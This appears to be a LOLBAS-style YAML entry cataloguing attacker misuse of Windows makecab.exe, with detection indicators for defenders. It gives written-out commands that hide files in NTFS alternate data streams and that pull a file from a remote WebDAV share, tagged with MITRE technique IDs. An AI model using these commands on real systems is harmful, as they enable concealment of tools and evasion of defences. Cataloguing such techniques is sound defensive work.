---
Name: Makecab.exe
Description: Binary to package existing files into a cabinet (.cab) file
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab
    Description: Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.
    Usecase: Hide data compressed into an alternate data stream
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab
    Description: Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.
    Usecase: Hide data compressed into an alternate data stream
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
    Description: Download and compresses the target file and stores it in the target file.
    Usecase: Download file and compress into a cab file
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\makecab.exe
  - Path: C:\Windows\SysWOW64\makecab.exe
Code_Sample:
- Code:
Detection:
 - IOC: Makecab getting files from Internet
 - IOC: Makecab storing data into alternate data streams
Resources:
  - Link: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
Acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
